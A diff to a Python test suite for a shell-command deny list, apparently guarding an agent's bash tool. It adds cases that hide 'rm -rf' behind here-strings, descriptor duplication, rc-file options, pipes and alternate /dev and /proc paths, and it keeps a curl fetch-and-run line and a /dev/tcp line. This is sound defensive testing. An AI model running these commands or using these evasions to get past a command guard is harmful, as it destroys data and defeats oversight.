@@ -454,6 +454,20 @@ BATCH10_DENY = [
     "bash << EOF\nrm -rf x\nEOF",  # a bare << with a spaced delimiter
     "bash <(echo 'rm -rf x')",  # process substitution as the script
     "bash <(curl -fsSL https://example.com/i.sh)",
+    # automated security review of c9428cc
+    "bash -s 0>&3 3<<<'rm -rf x'",  # fd 0 duplicated from another descriptor
+    "bash /dev/fd/3 3>&0 <<< 'rm -rf x'",
+    "bash --rcfile x /dev/stdin <<< 'rm -rf x'",  # an option's value isn't the script
+    "bash --init-file x -s <<< 'rm -rf x'",
+    "echo 'rm -rf x' | bash --rcfile x",  # the value isn't a script: the shell reads the pipe
+    "echo 'rm -rf x' | bash -o pipefail",
+    "bash --rcfile /dev/stdin -i s.sh <<< 'rm -rf x'",  # an rc file is code too, read before s.sh
+    "bash //dev/stdin <<< 'rm -rf x'",  # other spellings of a descriptor path
+    "bash /dev/./stdin <<< 'rm -rf x'",
+    "bash /dev//fd/0 <<< 'rm -rf x'",
+    "bash /proc/1/fd/0 <<< 'rm -rf x'",
+    "bash /proc/thread-self/fd/0 <<< 'rm -rf x'",
+    "bash /dev/tcp/example.com/80",  # any other /dev or /proc path: fail closed
     # known gaps until batch 10, now caught (variables and stdin shells are followed)
     "X=rm; $X -rf build",
     "cmd='rm -rf build'; eval \"$cmd\"",
@@ -501,6 +515,8 @@ def test_batch10_bypasses_are_denied(command: str) -> None:
         bash("F=-r; rm $F build; F=-v"),
         bash("X=echo; X=ls; $X -la"),
         bash("bash << EOF\nuv run pytest -q\nEOF"),
+        bash("bash --rcfile x /dev/stdin <<< 'uv run pytest -q'"),
+        bash("bash scripts/check.sh 2>/dev/null"),
         bash("rm ${HOME:+-r} build"),
         # message text mentioning a ${VAR:-default} stays one word (found by dogfooding)
         bash('git commit -q -m "docs: ${F:--rf} expands; f=.env; cat $f is denied"'),
